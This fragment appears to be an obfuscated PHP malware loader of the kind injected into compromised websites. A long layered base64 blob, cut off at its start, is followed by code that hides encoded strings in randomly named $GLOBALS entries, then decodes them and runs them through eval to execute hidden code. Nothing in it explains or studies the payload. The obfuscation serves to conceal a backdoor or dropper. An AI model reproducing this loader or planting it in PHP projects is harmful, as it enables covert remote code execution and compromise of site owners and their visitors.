ZtNVNURkV5ZEc1YVdHeERaVlp3V1ZWcVJtcGlWRkp1VjFab1MyVldiRmxoTWpsS1VtcHNVbFpVUlRWVWJGRjNWV3hhVlZKV1dtMVZhMVp6VlRGb05VNUhOV0ZYUlhBeldWWmtOR015UmxoVWJscHFVMFZ3YzFsNlRsTmhSWEExWkRKa1dVMVZTbFZYUkVGNFZVWktSMVpyTVZOV2FteEdWVEZhUzFwcmVIQmFSM2hxWW10S2QxbHJaRFJqUm10NVQxaGthbUpXV2paYVJXUkdaR3hzV0dOSGFHeFJNazU2VTFWWk5WVldWWGhQVlRWVlRVWktWMVpGVmxkYWJFcEdZa1pPV1dWVVVuVlhiR2hMWkRKR1dHVklUbWhXTURVeVdUQm9TMkpIVFhwVmJXaE5UV3MxZWxkV2FFOWxiSEJaVkZjMVRWRXdTbTFXVlZwUFdteFNWazlWVmxkV1dHaEhWMFJDVTFOc1ZuTlBTRlpMVFd4YU5Wa3daSE5qTWtwSVlrZHdhVTB3U2pWWGJHaFBUVVpzVkU5WGNHbFNNRm8yV1hwS1YyVnJkM2xoUjNocFUwVktjMWt5TlU1aWEzaEVVVzFhVmxKck5XMVdSbFUxVWxaYVZtVkZXbGxOUmtwTFZsZDNOR1JWYjNsV2JteHFVako0ZWxsclpITmhiVWw2VVc1c1lWZEZOSGRYVmswMVlXMUtTRkp1Y0dwTmJGbzJWRVJKTldWV2NFaFdibXhMWlZoa2JsZEVSa05XUm1kM1RWWkNVMUpzV2s1VmJGazFVbFpPVjFOdFdrMWhWMUp6V1RJMVEyTkhTa2hsU0VKYVRXcHNNMWt5TVZkbGJWSklVbGhhV2sxdWFHOVplazVQWWtkT05VOVlaR0ZTTVd4MVZFVk9RMXBzVmtkVWJWcFZWbFJzUmxac1ZqUlNiR2QzVld0d1ZtSkVhREZUYWtwWFpWZE9TR0pJVG1sU01uaHhXV3BPUTJWV2NGbFVha0phVlhwc2NWbHJaRWRsYlUxNVZtNXdUVTB3TkhkWmFrcFBZMnR3TldReVpGbE5WVXBWVjBSQmVGVkdTa2RXYXpGVFZtcHNSbFV4V2t0YWEzaHdXa2Q0YW1KclNuZFphMlEwWTBacmVVOVlaR3BpVmxvMldrVmtSbVJzYTNsUFdGWnJVMFZ3TWxsclpEUmlSMDUxVkZjMVRWRXdTbTFXVlZwUFdteFNWazlWVmxkV1dHaEhWMFJDVTFOc1ZuTlBTRlpMVFd4YU5Wa3daSE5qTWtwSVlrZHdhVTB3U2pWWGJHaFBUVVpzVkU5WGNHbE5hbFYzV1RJd05XTXlTa2hXYm14cVpWUnNiMWRyWTNoalIwcHdXVE5PU2xKcWJGSldWRVUxVkd4UmQxVnNXbFZTVmxwdFZXdFdjMVV4YURWT1J6VmhWMFZ3TTFsV1pEUmpNa1pZVkc1YWFsTkZjSE5aZWs1VFlVVjNlV05JY0V0bFdHUnVWMFJHUTFaR1ozZE5Wa0pUVW14YVRsVnNXVFZTVms1WFUyMWFUV0ZYVW5OWk1qVkRZMGRLU0dWSVFscE5hbXd6V1RJeFYyVnRVa2hTV0ZwcVRUQmFlbE51YkVKalJUazFVV3BzU2xORlNqVlpWbWhoWVVkU1NGWlhaR3BOTVVwdldrVmtjMkZyYkVoWGFrWnBZbFUwZDFsV1l6VmtWV3hJV2tkNGExSldXVEJYVkVvMFRWWndTRlpyTVdoWFJUUjNVekJPVTJKWFJsaGxSM2hNVlRCSk0xTlZUbE5pUjFaSVZHNU9TbEpFUW01WFZtaExaVlpzV1dFeU9VcFJNazR4VTI1c00xb3djRFZPU0ZaTFpWaGtibE5xU25Oa1ZuQklWbXBTVFdKclNuWlpNRTVxWXpCc1JGcElUbWxOYlZJeVZFY3hhMk5HY0hCWk0wNUtVVEpTZWxscVNtdGthM2gxVVc1V1lXVlhUbTVUTVZKNldqSkdXRmRYWkV4VFJVbzFWMnhrYTFwdFNsaFNha0phVFcxa2RsTnJWbXRVVmxGM1UydEtWVkpyTldsVFZ6QXhUbXhzVjJGSWJGcFdWR3d6VjFaYVIxTlhSbk5hUmxKaFZsVTBNVll3Vm05bFZXeHpUVWhXU21KSVpERlRWMnN3WVRGSmQyVkdRbEpoTUZwT1ZsUkdlbUZYU2xaUFZGWnNWbnBHTUZaRVRtdGxSMHBYWVVaU2EwMUlhRkpaYWs1SFVrWndWMVJYYkZsVk0yUnVVMnRrWVdOSFNraFdXRUpNVlRCS2Ixa3lOVXRoUjFaWFQxaGthMWRGTlhaVE1FNVRZa2RXU0ZSdVRrMVJNVXAwV1Zaa05HSkZkRlZqTW1ScVlsWlpkMXBHYUV0a1ZXeEVWVzE0YkZJd05YcFVNMnhEVDFWc1NWRnFSbHBpV0doM1YxaHNRMlZ0VWtoU2FrSm9WakF4YmxkdE5WZGtWbXQ2Vlc1Q2FVMXFVbTVXVkVrMVRWZE9kRlJ0ZUZSTmFsWXlXa1JLTkdKR2NFaGFSM2hNVVRKMGJscFliRUpoTVd3MVVWUnNTbEl3TkhoWk1qRTBXbTFHV0U1WVFtdFJNbVIzVkROc1FtRXlVbGxUYms1WlRXczBlRmt5TVRSYWJVcElZa2R3WVZaNlZuRlhiRTVDVDFWc1IxcEdVbEJsVlVaeVdrVmpOV05zY0ZoT1JHeHBWakZGZUZNd1RsTlRSbEpHVDFWT1VsWllhRlZXTTJ4TFlUSkdTVlZ1VG1waVIzaEtXVlZXTkZWWFVraE9WbFpzVW01Q2NGZHFTbTlrYlVaRVUyMVNURlpJVG01VGEyUlRaRzFLV0ZKdVFtbGlSR3d4VjFaamVHSkZiRVZOUjJSU1RXcHNNVmR0TVhOaWJWSlpVMjFvYTFJeWVESlpiWEIyVG14dmVWWnFRa3hSTVVwSlZrVlZOVkV4UmxabFJsSllaVlZ3Y1ZkWE5VdFdWMUowVkd0a1ZGWXllRTVaYWtJMFltMU9TV0ZJUm14U00wNXdWMFpPY2s0d2JFUlZha1pxWWxob2JWZFVUbGRsVjBwSFQxaE9hRll3TlhOWmJURlBZa1ZzUkU1RWJFcFJNVXBKVmtWVk5WRXhSbFpsUmxKWVpWVndhRlpWYUZOWlYwcEdaRWhvVTJKVWJISlpNRnB2VjFkV1dHUkVSbFpTTTFKWFdXdE9TMXBGZUhCVmFrSnBUVzVTYzFsdGF6QmhNVWwzWlVaQ1VtRXdXazVXVkVaNllWZE9TR0ZGVW14V1ZuQlFWbFZvUzFWWFRYaFJibWhzVmpOQ01scEZaR0ZOUmtwSlZGZHNXVlY2VW5KWGEyTTFaRVpzV0dKSVZsbE5hbFp2V1d4a1ZrNHdiRWhVYWtacVlsaG9iVmw2U2xkTlIwbDZVV3BDVEZFeFNuRlVSVTVEVWtaYVYxTnJNVlZOVlVwV1YwUkdWMVV4VWtSa01tUkxVMFphTlZscldUVmhiVkpaVTI1T1dVMXVhSGRYVkVwWFpGWnJlVlpZUWxCbFZVcHhXa1pvUzJNeFozcFViWGhyVW5wc00xcEZUbTVoTVd3MVpESmtVazFXV2xSV1JWVTFWVlphUjA5V1RsTldiRXBYVmxkek1WWldWbkpTYXpsV1RVWndSMVpYYkROYU1sSkpVMnBHWVZVeWN6TlRWV1JQVFZkT2RHVkhXbXBOYkZsM1dXcE9RMDFGZEVSVmJYQk5VVEJLUlZac1drdFVWbEY0VVd4V1dVMUhhRWRWVmxaVFVteFdjR1F5WkdGaVZWcDZXWHBLVm1ORk9UVlJWM1JwVFRGWmQxa3dhRmROUld4RlRVZGtXazB4V2pWWmExazFZa2RXU0ZadGNFeFJNVXB4VXpGU2Vsb3hhM3BXYm14cFVtcHNjVmxyWXpWbGJIQlVXakowV21WWGN6TlRWV2hMWWtkU1NWWnViR2xoVlVaeVdXcE9WMDFIVGtsV2FrSlFaVlZKTlZOVlozZGFNVUkyVGtRd2JrdFRORzVRUkRsM1lVaEJaMHA1YXpkSlJEZ3IiKTskR0xPQkFMU1siT2tMT051YXB5Vm5ZR09PcXJTUVYiXT1iYXNlNjRfZGVjb2RlKCJXVzFHZWxwVVdUQllNbEpzV1RJNWExcFRaMnRTTVd4M1ltNWFWV1JzWkc5a1EyczkiKTsNCj8+PD9waHAgZnVuY3Rpb24gWG5VZ1pld2Focm1STlBJT0JBTGIoJEdZcG52VHZXaHQpeyRyPWJhc2U2NF9kZWNvZGUoJEdMT0JBTFNbIk9rTE9OdWFweVZuWUdPT3FyU1FWIl0pO3JldHVybiBldmFsKCJyZXR1cm4gJHI7Iik7fSBldmFsKCc/PicuWG5VZ1pld2Focm1STlBJT0JBTGIoJEdMT0JBTFNbImFPWkJqdFV1WGhzS3FPT0pacnNRIl0pLiRHTE9CQUxTWyJrdXBjcGNjdFdkWkxTT2F5ZFdQIl0pOyA/Pg==').'<?php '); ?>').'<?php '); ?>